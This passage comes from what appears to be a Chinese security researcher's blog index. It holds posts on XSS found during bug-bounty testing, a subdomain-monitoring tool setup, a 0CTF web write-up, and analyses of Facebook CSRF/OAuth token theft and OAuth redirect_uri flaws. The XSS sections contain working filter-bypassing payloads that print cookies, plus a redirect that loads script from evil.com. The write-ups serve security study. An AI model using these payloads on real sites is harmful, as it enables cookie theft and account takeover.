+<p>漏洞逻辑：<br>上传图片-&gt;提交反馈-&gt;服务端拼接提交的img参数(uri)为img标签src属性的完整地址</p>
+<p>测试上传一个图片后，点击提交反馈并抓包，<code>imglist</code>参数是刚才上传图片返回的uri地址。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-aca2a2bc-5679-1.png" alt="image_1d6vj4nch1a5p118b18ci1gu31olam.png-235.9kB"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST xxxx?q=index/feedback HTTP/1.1</span><br><span class="line"></span><br><span class="line">imglist=%2Cpicture%2F2019%2F02%2F22%2F_a948b4eeaca7420cad9d54fdb0331230.jpg&amp;</span><br></pre></td></tr></table></figure>
+
+<p>问题就出在拼接标签这部分，修改imglist参数就可以闭合Src属性进行xss,使最终的img标签执行onerror事件</p>
+<p>步骤：抓包修改img路径-&gt;拼接恶意js事件，POC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imglist=urlencode(&quot; onerror=&quot;alert(`XSS�`)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acc0b540-5679-1.png" alt></p>
+<p>成功弹窗<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-accf7fa8-5679-1.png" alt="image_1d6vjv0dfkis172e1mkpd9b78c13.png-78kB"></p>
+<h1 id="邮件提交处的XSS"><a href="#邮件提交处的XSS" class="headerlink" title="邮件提交处的XSS"></a>邮件提交处的XSS</h1><p>在测试某业务的邮箱密码验证时，发现一个包含请求邮箱的页面。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acea5b84-5679-1.png" alt="image_1d6vf99vp1smijbq1q9pa1s1sfh2d.png-297.8kB"></p>
+<p>记得之前看过一篇文章，有些服务在发送完邮件后会弹出一个“邮件已发送+email”的页面导致反射型XSS，感觉就是这种了。</p>
+<p>随手测试了一下，发现直接waf了空格、双引号、尖括号，和”&quot;。实体了html编码的尖括号，但是没有实体html编码的双引号。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad08fdbe-5679-1.png" alt="image_1d6vf627h11u1ru6slc13uu1qqt1j.png-337.5kB"></p>
+<p>同时在FUZZ的期间多次出现参数错误的请求，发现可能是应用层做了些过滤：</p>
+<ol>
+<li>email字符串长度&lt;40且@结尾</li>
+<li>不能同时出现两个双引号、括号</li>
+<li>正则alert(1)\prompt(1)\confim…</li>
+</ol>
+<p>不过只要脱离引号就好说，毕竟有很多JS事件可以调。一开始把眼光放在了input标签上测试了一些on事件，发现type是hidden，一些可视on事件都没用的。记得之前看过一个input hidden xss的一个用法是按alt+shift+x触发，poc如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urlencode(email=&amp;#34/accesskey=&amp;#34X&amp;#34/onclick=&amp;#34alert&amp;#40&apos;xss&apos;&amp;#41&amp;#34@qq.com)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad17de9c-5679-1.png" alt="image_1d6vfebe9k0q1704vhff8u16cq2q.png-39kB"></p>
+<p>但是这个poc很鸡肋。因为要打出cookie的话长度受限，且利用条件苛刻(firefox+按键)</p>
+<p>回头看了下发现有form标签也有输出点，最初以为form能执行的JS事件就只有reset和submit，后来测试跑onmounseover也能弹框。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encodeurl(email=&amp;#34/onmouseover=&amp;#34alert&amp;#40document.cookie&amp;#41&amp;#34@qq.com)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad29e16e-5679-1.png" alt="image_1d71n2s5m1mnpvbslfj1iatkg99e.png-70.9kB"></p>
+<h1 id="一个受阻的XSS"><a href="#一个受阻的XSS" class="headerlink" title="一个受阻的XSS"></a>一个受阻的XSS</h1><p>在测试某业务时发现一个有趣的参数拼接点：</p>
+<p>iframe的src拼接url参数+后端给定的第三方host-&gt;iframe加载src</p>
+<p>测试了一下特殊字符都给实体化了，但是又舍不得一个iframe<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad3e1f30-5679-1.png" alt="image_1d6vl16bn14i9ihun3ovnvnd4k.png-187.5kB"></p>
+<p>经过一番寻找，发现第三方服务的登陆点存在JS跳转漏洞，用iframe加载这个第三方服务的dom-xss也能造成弹框效果<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad523f1a-5679-1.png" alt="image_1d6vleeqr1r4613u81e81cja1m3h5h.png-106.4kB"></p>
+<p>虽然是在SRC业务站点弹的框，但真正的域应该是子页面的。打印一下COOKIE验证，果然是子页面域的cookie。由于waf掉了document.cookie和javascript:alert，我用了html编码的’:’和八进制js编码的’.’绕过，完整打印子页面域payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(document\56cookie)</span><br></pre></td></tr></table></figure>
+
+<p>在进一步的探索中，我做了两个尝试：</p>
+<ol>
+<li>尝试跳一个外域的JS，看能不能把src属性转到这个js<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://src.com?url=redirect_uri%3Dhttps://evil.com/xss.js</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>但是会把资源解析到子页面的document里，而不是src的改变<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad63994a-5679-1.png" alt="image_1d6vm2dvb1ls2185k1hof58miho5u.png-128.4kB"></p>
+<ol start="2">
+<li>iframe是否能调用父页面的事件呢(document)？如果可以的话我们就直接调js uri把cookie打出去。之所以有这个想法是因为，当时寻思既然站点调用这个三方服务了，很大可能性这个三方站是iframe-src白名单。不过测试后发现依然被跨域限制，测试payload<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(window.parent.document\56cookie)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad6accec-5679-1.png" alt="image_1d6fi5odbg1pnb7nfdgs7ji6p.png-13.7kB"></p>
+<p>对跨域姿势了解的不多，如果有兴趣的师傅，可以一起来交流一下这种问题</p>
+<h1 id="自闭总结"><a href="#自闭总结" class="headerlink" title="自闭总结"></a>自闭总结</h1><p>从打ctf到学着去挖洞，还是有一些思维出入的地方，慢慢理解之前师傅们说的资产收集的重要性。</p>
+<p>也特别感谢引路人鬼麦子师傅给予的帮助，这里顺便推荐麦子师傅基于爬虫的一款开源子域名监控工具<a href="https://github.com/guimaizi/get_domain" target="_blank" rel="noopener">get_domain</a>，在搭建过程中如果遇到环境配置问题，可以参考这篇<a href="http://hpdoger.me/2019/03/30/Ubuntu16.04%E6%90%AD%E5%BB%BA%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7%E6%9C%8D%E5%8A%A1Get_domain/" target="_blank" rel="noopener">Ubuntu16.04-Get_domain搭建手册</a></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/04/05/SRC挖掘初探之随缘XSS挖掘/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/03/30/Ubuntu16.04搭建子域名监控服务Get_domain/"> 
+                    Ubuntu16.04-子域名监控工具Getdomain环境搭建 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-03-30   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="Ubuntu16-04-子域名监控Get-domain环境搭建"><a href="#Ubuntu16-04-子域名监控Get-domain环境搭建" class="headerlink" title="Ubuntu16.04-子域名监控Get_domain环境搭建"></a>Ubuntu16.04-子域名监控Get_domain环境搭建</h1><p>操作环境：Ubuntu16.04<br>数据库：Mongdb<br>项目地址：<a href="https://github.com/guimaizi/get_domain" target="_blank" rel="noopener">https://github.com/guimaizi/get_domain</a></p>
+<h1 id="各种依赖安装"><a href="#各种依赖安装" class="headerlink" title="各种依赖安装"></a>各种依赖安装</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git python3 python3-pip xvfb unzip libxss1 libappindicator1 libindicator7 -y</span><br><span class="line"></span><br><span class="line">sudo pip3 install selenium pymongo</span><br></pre></td></tr></table></figure>
+
+<h1 id="安装mongodb服务端"><a href="#安装mongodb服务端" class="headerlink" title="安装mongodb服务端"></a>安装mongodb服务端</h1><ol>
+<li><p>添加mongodb签名到APT</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv EA312927</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建/etc/apt/sources.list.d/mongodb-org-3.2.list文件并写入命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;deb http://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.2 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.2.list</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>更新软件源列表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>安装mongodb（默认是安装稳定版）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y mongodb-org</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="配置mongodb服务端"><a href="#配置mongodb服务端" class="headerlink" title="配置mongodb服务端"></a>配置mongodb服务端</h1><ol>
+<li>修改配置文件<code>/etc/mongodb.conf</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改后的内容如下：</span><br><span class="line">bind_ip = 0.0.0.0</span><br><span class="line">port = 27017</span><br><span class="line">auth=true (添加帐号,密码认证)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>修改后重启mongodb:sudo service mongodb restart</p>
+<ol start="2">
+<li><p>添加超级用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use admin</span><br><span class="line">db.createUser(&#123;user:&apos;admin&apos;,pwd:&apos;123456aaa1xsda1A&apos;,roles:[&#123;role:&apos;userAdminAnyDatabase&apos;,db:&apos;admin&apos;&#125;]&#125;)</span><br><span class="line">db.auth(&apos;admin&apos;,&apos;123456aaa1xsda1A&apos;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>添加扫描器用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use target_domain</span><br><span class="line">db.createUser(&#123;user:&apos;target&apos;,pwd:&apos;123456aaaxsda1A&apos;,roles:[&#123;role:&apos;readWrite&apos;,db:&apos;target_domain&apos;&#125;]&#125;)</span><br><span class="line">db.auth(&apos;target&apos;,&apos;123456aaaxsda1A&apos;)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="安装chromedriver"><a href="#安装chromedriver" class="headerlink" title="安装chromedriver"></a>安装chromedriver</h1><p>先安装Chrome浏览器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libxss1 libappindicator1 libindicator7</span><br><span class="line">wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</span><br><span class="line">sudo dpkg -i google-chrome*.deb</span><br><span class="line">sudo apt-get install -f</span><br></pre></td></tr></table></figure>
+
+<p>再安装chromedriver</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget -N http://chromedriver.storage.googleapis.com/72.0.3626.7/chromedriver_linux64.zip</span><br><span class="line">unzip chromedriver_linux64.zip</span><br><span class="line">chmod +x chromedriver</span><br><span class="line">sudo mv -f chromedriver /usr/local/share/chromedriver</span><br><span class="line">sudo ln -s /usr/local/share/chromedriver /usr/local/bin/chromedriver</span><br><span class="line">sudo ln -s /usr/local/share/chromedriver /usr/bin/chromedriver</span><br></pre></td></tr></table></figure>
+
+<h1 id="安装go-lang"><a href="#安装go-lang" class="headerlink" title="安装go-lang"></a>安装go-lang</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get -y upgrade</span><br><span class="line">$ wget https://storage.googleapis.com/golang/go1.7.linux-amd64.tar.gz</span><br><span class="line">$ sudo tar -xvf go1.7.linux-amd64.tar.gz</span><br><span class="line">$ sudo mv go /usr/local</span><br></pre></td></tr></table></figure>
+
+<p>设置gopath</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line">export GOROOT=/usr/local/go  #设置为go安装的路径，有些安装包会自动设置默认的goroot</span><br><span class="line">export GOPATH=$HOME/gocode   #默认安装包的路径</span><br><span class="line">export PATH=$PATH:$GOROOT/bin:$GOPATH/bin</span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>
+
+<p>go env看一下是否设置成功</p>
+<h1 id="设置Python默认为Python3"><a href="#设置Python默认为Python3" class="headerlink" title="设置Python默认为Python3"></a>设置Python默认为Python3</h1><p>文章：<a href="https://blog.csdn.net/u011534057/article/details/51615193" target="_blank" rel="noopener">https://blog.csdn.net/u011534057/article/details/51615193</a></p>
+<p>使用文章的第二种方法：在系统级修改 Python 版本</p>
+<h1 id="下载subfinder"><a href="#下载subfinder" class="headerlink" title="下载subfinder"></a>下载subfinder</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/subfinder/subfinder</span><br></pre></td></tr></table></figure>
+
+<p>报错没关系，只要文件里有bin src就行</p>
+<h1 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h1><p>见<a href="http://www.guimaizi.com/archives/360的启动说明" target="_blank" rel="noopener">http://www.guimaizi.com/archives/360的启动说明</a></p>
+<p>crontab定时执行任务：<a href="https://www.jianshu.com/p/838db0269fd0" target="_blank" rel="noopener">https://www.jianshu.com/p/838db0269fd0</a></p>
+<p>crontab文件如下，每天12点执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># everday 12:00 am exec</span><br><span class="line">0 0 17 * * ? python /home/get_domain/while_update.py</span><br></pre></td></tr></table></figure>
+
+<p>注意最后要留个空行</p>
+<h1 id="Mongodb操作"><a href="#Mongodb操作" class="headerlink" title="Mongodb操作"></a>Mongodb操作</h1><p>更新，否则无法进行对比，更新状态到0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.getCollection(&apos;xxx&apos;).update(&#123;&apos;state&apos;:1&#125;,&#123;$set:&#123;&apos;state&apos;: NumberInt(0)&#125;&#125;,&#123;multi:true&#125;)</span><br></pre></td></tr></table></figure>
+
+<h1 id="一直运行random-start"><a href="#一直运行random-start" class="headerlink" title="一直运行random_start"></a>一直运行random_start</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup python -u random_start.py &gt; nohup.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
+
+<p>记得修改random_start的代码为while 1<br>可以修改五次config,运行五个后台程序</p>
+<h1 id="各种报错解决"><a href="#各种报错解决" class="headerlink" title="各种报错解决"></a>各种报错解决</h1><h2 id="报错代码127"><a href="#报错代码127" class="headerlink" title="报错代码127"></a>报错代码127</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selenium.common.exceptions.WebDriverException: Message: Service chromedriver unexpectedly exited. Status code was: 127</span><br></pre></td></tr></table></figure>
+
+<p>原因是browser版本过低，跟driver不匹配，升级browser</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install chromium-browser</span><br></pre></td></tr></table></figure>
+
+<h2 id="权限报错"><a href="#权限报错" class="headerlink" title="权限报错"></a>权限报错</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selenium.common.exceptions.WebDriverException: Message: unknown error: Chrome failed to start: exited abnormall</span><br></pre></td></tr></table></figure>
+
+<p>chromedriver在py程序里没权限，修改代码Browser.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chrome_options.add_argument(&apos;--headless&apos;)</span><br><span class="line">chrome_options.add_argument(&apos;--no-sandbox&apos;)</span><br></pre></td></tr></table></figure>
+
+<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p>安装mongodb:<a href="https://www.jianshu.com/p/5598f1dcbb98" target="_blank" rel="noopener">https://www.jianshu.com/p/5598f1dcbb98</a></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/03/30/Ubuntu16.04搭建子域名监控服务Get_domain/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/03/25/0CTF2019-Web1WriteUp/"> 
+                    0CTF2019-Web1WriteUp 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-03-25   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="0CTF-Web1"><a href="#0CTF-Web1" class="headerlink" title="0CTF Web1"></a>0CTF Web1</h1><p>第一次打0ctf，长见识了，各路神仙满天飞..</p>
+<p>题目地址：<a href="http://111.186.63.207:31337" target="_blank" rel="noopener">http://111.186.63.207:31337</a></p>
+<p>需要一个karaf认证，直接双写karaf<br><img src="http://static.zybuluo.com/1160307775/jjadmv0j4cbreq70dc6l9esd/image_1d6nu1vae155hklkc5e15c41ak99.png" alt="image_1d6nu1vae155hklkc5e15c41ak99.png-15.3kB"></p>
+<p>当时组内师傅说有jolokia<br><img src="http://static.zybuluo.com/1160307775/vbmi61p7x4a5qmtsrsqodszt/image_1d6nu81co9hr1ac74nk2rs1n3um.png" alt="image_1d6nu81co9hr1ac74nk2rs1n3um.png-49.8kB"></p>
+<p>去搜了一下jolokia的洞，看到了Lucifaer师傅的两篇分析文章<br><a href="https://lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/#0x05-poc%E6%9E%84%E9%80%A0" target="_blank" rel="noopener">https://lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/#0x05-poc%E6%9E%84%E9%80%A0</a></p>
+<p><a href="https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc" target="_blank" rel="noopener">https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc</a></p>
+<p>大致意思就是，执行器可以调用jolokia的list里类的函数来执行一些操作。可是搜了一下List没有logback可以用，但是题目里很明显提示有karaf，那么是否可以通过控制器的poc安装一个karaf控制台呢？所有karaf的时候有下面这个op</p>
+<p><img src="http://static.zybuluo.com/1160307775/j1j2pt3lm0j8jtr9b63ehk7p/image_1d6qgq8tn1qaa1hhlbr2nl413s11m.png" alt="image_1d6qgq8tn1qaa1hhlbr2nl413s11m.png-7.2kB"></p>
+<p><img src="http://static.zybuluo.com/1160307775/m7j4c61sux7w6ovgpox6e8ol/image_1d6qgok3kjq716kir4b1k1v6as9.png" alt="image_1d6qgok3kjq716kir4b1k1v6as9.png-12kB"></p>
+<p>最终POC，利用luciafaer师傅的post数据包改造，mbean+op+args</p>
+<p>注意content-type:applicatio/json，bp直接发包太坑了</p>
+<p><img src="http://static.zybuluo.com/1160307775/nwnjcjdnn91n2qa6dpk35rvn/image_1d6num88ikml1pqe1jid1sln1kuh13.png" alt="image_1d6num88ikml1pqe1jid1sln1kuh13.png-111.6kB"></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/03/25/0CTF2019-Web1WriteUp/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/"> 
+                    对“绕过Facebook Token进行CSRF账号接管”的文章解读 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-02-18   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="浅谈绕过Facebook-Token进行CSRF账号接管"><a href="#浅谈绕过Facebook-Token进行CSRF账号接管" class="headerlink" title="浅谈绕过Facebook Token进行CSRF账号接管"></a>浅谈绕过Facebook Token进行CSRF账号接管</h1><p>今天早上看到Sam大佬推特发了这篇文章，下午就见到先知上有译文了。为什么有译文了还要写这篇文章呢？安全圈的译文你懂的，大部分右键一把梭。</p>
+<p>从文章本身来说，还是有比较值得学习的地方，所以摘出来流程分析一下。</p>
+<p>原文：<a href="https://ysamm.com/?p=185" target="_blank" rel="noopener">https://ysamm.com/?p=185</a></p>
+<p>先知译文: <a href="https://xz.aliyun.com/t/4089#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/4089#toc-5</a></p>
+<h1 id="漏洞关键条件"><a href="#漏洞关键条件" class="headerlink" title="漏洞关键条件"></a>漏洞关键条件</h1><p>攻击者有一个oauth认证接口，即漏洞网站可以授权自己的网站</p>
+<h1 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h1><p><img src="https://i.loli.net/2019/02/19/5c6c1ace4e4e3.jpg" alt></p>
+<p>第二步，即location的Url如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.facebook.com/comet/dialog_DONOTUSE/?</span><br><span class="line">url=/add_contactpoint/dialog/submit/%3fcontactpoint=&#123;EMAIL_CHOSEN&#125;%26next=</span><br><span class="line">/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d&#123;ATTACKER_APP&#125;%2526redirect_uri%253d&#123;DOUBLE_URL_ENCODED_LINK]</span><br></pre></td></tr></table></figure>
+
+<p>next参数为<strong>下一步跳转参数</strong>，即邮箱绑定后跳转到<code>/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code>获取token再redirect到attacker web</p>
+<h1 id="总结-修复思考"><a href="#总结-修复思考" class="headerlink" title="总结/修复思考"></a>总结/修复思考</h1><p>漏洞新颖的点就在授权后的跳转，这也算是一种突破oauth的新思路。利用信任站点的重定向进行其它oauth的绑定，再携带token二次重定向到attacker web。</p>
+<p>如果能再二次重定向的地方加一个权限验证，即attacker app与oauth匹配，会不会避免这样的越权呢？</p>
+<p>其次就是，如果我们省略三方授权，直接诱导用户点击第二步的location，不就更省事了么？这点我邮寄了sam师傅，希望日后有其它研究的师傅可以指点一下~</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/02/14/Oauth2的两类漏洞挖掘/"> 
+                    Oauth2的两类漏洞挖掘 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-02-14   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="Oauth2的两类漏洞挖掘"><a href="#Oauth2的两类漏洞挖掘" class="headerlink" title="Oauth2的两类漏洞挖掘"></a>Oauth2的两类漏洞挖掘</h1><p>一直忘了总结这个，结合OPPX的网站(无漏洞站点)说明一下</p>
+<h2 id="redict-uri限制不严格-Oauth配置错误"><a href="#redict-uri限制不严格-Oauth配置错误" class="headerlink" title="redict_uri限制不严格(Oauth配置错误)"></a>redict_uri限制不严格(Oauth配置错误)</h2><h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><p>一般登陆选项是这样，常见的是QQ/微信/微博/…授权登陆<br><img src="https://i.loli.net/2019/02/14/5c64d712383f4.png" alt></p>
+<p>点击QQ授权的时候请求包和返回包如下<br><img src="https://i.loli.net/2019/02/14/5c64d71326e9b.png" alt></p>
+<p>request:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /oauth2.0/authorize HTTP/1.1</span><br><span class="line">Host: graph.qq.com</span><br><span class="line">response_type=code&amp;client_id=100498628&amp;redirect_uri=https%3A%2F%2Fmy.oppo.com%2Fauth%2Fqqcallback&amp;scope=get_user_info%2Cadd_share%2Clist_album%2Cadd_album%2Cupload_pic%2Cadd_topic%2Cadd_one_blog%2Cadd_weibo%2Ccheck_page_fans%2Cadd_t%2Cadd_pic_t%2Cdel_t%2Cget_repost_list%2Cget_info%2Cget_other_info%2Cget_fanslist%2Cget_idolist%2Cadd_idol%2Cdel_idol%2Cget_tenpay_addr&amp;state=49085978f5e969063165246c6d07e062&amp;switch=&amp;from_ptlogin=1&amp;src=1&amp;update_auth=1&amp;openapi=80901010&amp;g_tk=1156350624&amp;auth_time=1550070856795&amp;ui=97557FF6-0331-4598-BC09-6CD21B7106E0</span><br></pre></td></tr></table></figure>
+
+<p>response:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Wed, 13 Feb 2019 15:17:13 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 0</span><br><span class="line">Connection: close</span><br><span class="line">Location: https://my.oppo.com/auth/qqcallback?code=5E0AA09C0CA8179C186688ABAF4BE043&amp;state=49085978f5e969063165246c6d07e062</span><br></pre></td></tr></table></figure>
+
+<p>流程：请求graph.qq.com获得授权，拿到auth code后拼接到redirect_uri再请求，这点可以在返回包中的Location看到。</p>
+<p>漏洞思路就是redict_uri限制不到位，严重的情况是没有限制域，一般情况是redict_uri可以到子域。QQ做了限制，拿cline_id和redirec_uri比对，不相符就返回False，如下<br><img src="https://i.loli.net/2019/02/14/5c64d712c68d7.png" alt></p>
